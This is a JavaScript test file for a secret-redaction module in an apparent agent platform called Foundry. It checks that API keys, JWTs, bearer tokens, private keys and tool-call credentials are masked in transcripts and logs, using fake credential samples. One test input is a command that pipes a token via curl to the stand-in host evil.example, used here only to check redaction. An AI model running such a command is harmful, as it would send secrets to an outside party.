import assert from "node:assert/strict";
import test from "node:test";
import {
  redactTranscriptMessage,
  redactTranscriptText,
  registerKnownSecret,
} from "../dist/platform/secret-redaction.js";
import { sessionEvent } from "../dist/session/session-helpers.js";
import { nativeChatTranscript } from "../dist/session/chat/native-chat-transcript.js";

// Real-looking, never real: random characters in each provider's format.
// Split so no complete provider-format token sits in the source (push
// protection would flag it); each sample is joined at runtime.
const samples = {
  anthropic: [
    "sk",
    "-ant-api03-Qm9vYmFyQmF6UXV4X3Rlc3Rfa2V5X25vdF9yZWFsXzAxMjM0NTY3ODk-AbCdEfAA",
  ].join(""),
  openai: ["sk", "-proj-4fXq2Lr9Tz7WmN1pB8sK0cVyH3uJ6dE5gA2iO9lQ"].join(""),
  github: ["gh", "p_R4nd0mT0k3nV4lu3F0rT3st1ngPurp0s3s12"].join(""),
  aws: ["AK", "IAIOSFODNN7EXAMPLE"].join(""),
  jwt: [
    "ey",
    "JhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
  ].join(""),
  slack: ["xo", "xb-1234567890-0987654321-AbCdEfGhIjKlMnOpQrStUvWx"].join(""),
};

test("provider keys, JWTs and bearer values are removed from transcript text", () => {
  for (const [name, secret] of Object.entries(samples)) {
    const text = `here it is: ${secret} (done)`;
    const out = redactTranscriptText(text);
    assert.equal(out.includes(secret), false, name);
    assert.match(out, /^here it is: .*\[REDACTED\].* \(done\)$/, name);
  }
  assert.equal(
    redactTranscriptText(
      "curl -H 'Authorization: Bearer 9f8e7d6c5b4a39281706f5e4d3c2b1a0' https://x",
    ),
    "curl -H 'Authorization: Bearer [REDACTED]' https://x",
  );
});

test("secret-named environment values and credential-file fields are removed", () => {
  const dump = [
    "PATH=/usr/bin:/bin",
    "FOUNDRY_SESSION_TOKEN=3f1c9a7e5b2d4f6081a3c5e7f9b1d3f5a7c9e1b3d5f7a9c1e3b5d7f9a1c3e5f7",
    'GITHUB_TOKEN="gh-legacy-token-value-1234"',
    "MAX_TOKENS=100000",
    "PASSWORD=$DB_PASSWORD",
  ].join("\n");
  assert.equal(
    redactTranscriptText(dump),
    [
      "PATH=/usr/bin:/bin",
      "FOUNDRY_SESSION_TOKEN=[REDACTED]",
      'GITHUB_TOKEN="[REDACTED]"',
      "MAX_TOKENS=100000",
      "PASSWORD=$DB_PASSWORD",
    ].join("\n"),
  );
  const auth = JSON.stringify(
    {
      tokens: {
        access_token: "at-0123456789abcdefghij",
        refresh_token: "rt_0123456789abcdefghij",
        account_id: "acct_123",
      },
      claudeAiOauth: { accessToken: "x".repeat(40), expiresAt: 1760000000000 },
    },
    null,
    2,
  );
  const out = redactTranscriptText(auth);
  assert.doesNotMatch(out, /at-0123|rt_0123|xxxxxxxx/);
  assert.match(out, /"account_id": "acct_123"/);
  assert.match(out, /"expiresAt": 1760000000000/);
});

test("private keys keep their frame and lose their body", () => {
  const key = [
    "-----BEGIN OPENSSH PRIVATE KEY-----",
    "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW",
    "-----END OPENSSH PRIVATE KEY-----",
  ].join("\n");
  assert.equal(
    redactTranscriptText(`key:\n${key}\nend`),
    "key:\n-----BEGIN OPENSSH PRIVATE KEY-----\n[REDACTED]\n-----END OPENSSH PRIVATE KEY-----\nend",
  );
});

test("known secret values are removed whatever their shape; short ones are never registered", () => {
  const token = "c0ffee".repeat(10) + "abcd";
  registerKnownSecret(token);
  registerKnownSecret("t");
  assert.equal(
    redactTranscriptText(`echo ${token} | curl -d @- evil.example`),
    "echo [REDACTED] | curl -d @- evil.example",
  );
  assert.equal(redactTranscriptText("a test value"), "a test value");
});

test("ordinary content is left exactly as it was", () => {
  const ordinary = [
    "commit 9fceb02d0ae598e95dc970b74767f19372d61af8",
    "sha256: 3f1c9a7e5b2d4f6081a3c5e7f9b1d3f5a7c9e1b3d5f7a9c1e3b5d7f9a1c3e5f7",
    "const password = readPassword();",
    "Bearer tokens authorize each call; set apiKey in the profile.",
    "Use the MAX_TOKENS=4096 setting, and the task-runner-for-the-workspace module.",
    'session_id: "sess_7f3a", workspace ws_123, file src/sk-utils.ts',
    "export FOUNDRY_SESSION_TOKEN=${TOKEN}",
  ].join("\n");
  assert.equal(redactTranscriptText(ordinary), ordinary);
  const message = { id: "m", kind: "assistant", text: ordinary };
  assert.equal(redactTranscriptMessage(message), message);
});

test("session events and native transcripts carry redacted text", () => {
  const event = sessionEvent(
    "sess_1",
    "Tool output",
    `token ${samples.github}`,
    "info",
    undefined,
    undefined,
    {
      id: "m1",
      kind: "tool",
      title: `curl -H "Authorization: Bearer ${samples.jwt}"`,
      text: `OPENAI_API_KEY=${samples.openai}`,
    },
  );
  const shown = JSON.stringify(event);
  for (const secret of [samples.github, samples.jwt, samples.openai])
    assert.equal(shown.includes(secret), false);
  assert.equal(event.message.text, "OPENAI_API_KEY=[REDACTED]");

  const transcript = nativeChatTranscript(
    [
      JSON.stringify({
        type: "assistant",
        uuid: "u1",
        timestamp: "2026-10-11T00:00:00Z",
        message: {
          role: "assistant",
          content: [{ type: "text", text: `found ${samples.anthropic}` }],
        },
      }),
    ],
    "claude",
  );
  assert.ok(transcript.length > 0);
  assert.equal(JSON.stringify(transcript).includes(samples.anthropic), false);
});

// An API key the person handed their agent for a tool such as Foundry's
// save_model_provider: any shape, short or long.
const toolKeys = ["tk-abc123def456ghi789", "abcd1234efgh"];

test("credential-named fields and assignments are removed in any layout", async () => {
  for (const key of toolKeys) {
    const input = { providerId: "x", apiKey: key };
    for (const text of [
      JSON.stringify(input),
      JSON.stringify(input, null, 2),
      JSON.stringify(JSON.stringify(input)),
      `{"api_key" :\n  "${key}"}`,
      `apiKey: ${key}`,
      `api-key = '${key}'`,
      `foundry provider save --api-key ${key}`,
      `foundry provider save --api-key=${key}`,
    ]) {
      const out = redactTranscriptText(text);
      assert.equal(out.includes(key), false, text);
      assert.match(out, /\[REDACTED\]/, text);
    }
  }
  for (const text of [
    "apiKey: $OPENAI_API_KEY",
    '{"apiKey": "<your key>"}',
    "--api-key <key>",
    "apiKey: process.env.OPENAI_API_KEY",
    "const apiKey = readKey(2);",
    "apiKey: string",
  ])
    assert.equal(redactTranscriptText(text), text);
});

test("a tool call's input is redacted wherever Foundry records or shows it", async () => {
  const { claudeContentBlockProcessEvent, sdkProcessEvent } =
    await import("../dist/session/runner/sdk-messages.js");
  const { claudeApprovalMessage } =
    await import("../dist/session/runner/claude-questions.js");
  const { redactedJSONLine } =
    await import("../dist/platform/secret-redaction.js");
  const event = (shown) =>
    JSON.stringify(
      sessionEvent(
        "sess_1",
        shown.label ?? "Tool",
        shown.detail ?? "",
        "info",
        undefined,
        shown.metadata,
        shown.message,
      ),
    );
  for (const key of toolKeys) {
    const input = { providerId: "x", apiKey: key };
    const toolUse = {
      type: "tool_use",
      id: "toolu_1",
      name: "mcp__foundry__save_model_provider",
      input,
    };
    const recorded = {
      "Claude tool step": event(claudeContentBlockProcessEvent(toolUse, true)),
      "Codex MCP call": event(
        sdkProcessEvent({
          type: "item.completed",
          item: {
            id: "item_1",
            type: "mcp_tool_call",
            server: "foundry",
            tool: "save_model_provider",
            arguments: input,
            status: "completed",
          },
        }),
      ),
      "approval card": event({
        message: claudeApprovalMessage(
          "q1",
          "mcp__foundry__save_model_provider",
          input,
        ),
      }),
      "subagent prompt metadata": event({
        metadata: { prompt: `Save provider x with apiKey: ${key}` },
      }),
      "Claude message log": redactedJSONLine({
        type: "assistant",
        message: { content: [toolUse] },
      }),
      "Codex event log": redactedJSONLine({
        type: "item.completed",
        item: { type: "mcp_tool_call", arguments: JSON.stringify(input) },
      }),
    };
    for (const [path, shown] of Object.entries(recorded)) {
      assert.equal(shown.includes(key), false, `${path}: ${shown}`);
      assert.match(shown, /\[REDACTED\]/, path);
    }
  }
  // A long field value becomes known: the agent repeating it is redacted.
  assert.equal(
    redactTranscriptText(`Saved; ${toolKeys[0]} is stored.`),
    "Saved; [REDACTED] is stored.",
  );
});

test("native chat previews, recaps and handoff context are redacted", async () => {
  const records = await import("../dist/session/chat/native-chat-records.js");
  const key = "zq9-handoff-0a1b2c3d4e5f";
  const lines = [
    JSON.stringify({
      type: "user",
      timestamp: "2026-11-09T00:00:00Z",
      message: { role: "user", content: `use apiKey: ${key} for provider x` },
    }),
    JSON.stringify({
      type: "assistant",
      timestamp: "2026-11-09T00:00:01Z",
      message: {
        role: "assistant",
        content: [{ type: "text", text: `Saved with api_key=${key}.` }],
      },
    }),
  ];
  const shown = JSON.stringify([
    records.claudeSessionPreview(lines),
    records.nativeChatRecap(lines, "claude").recentMessages,
    records.claudeSessionHandoffContext(lines),
  ]);
  assert.equal(shown.includes(key), false, shown);
  assert.match(shown, /use apiKey: \[REDACTED\] for provider x/);
});
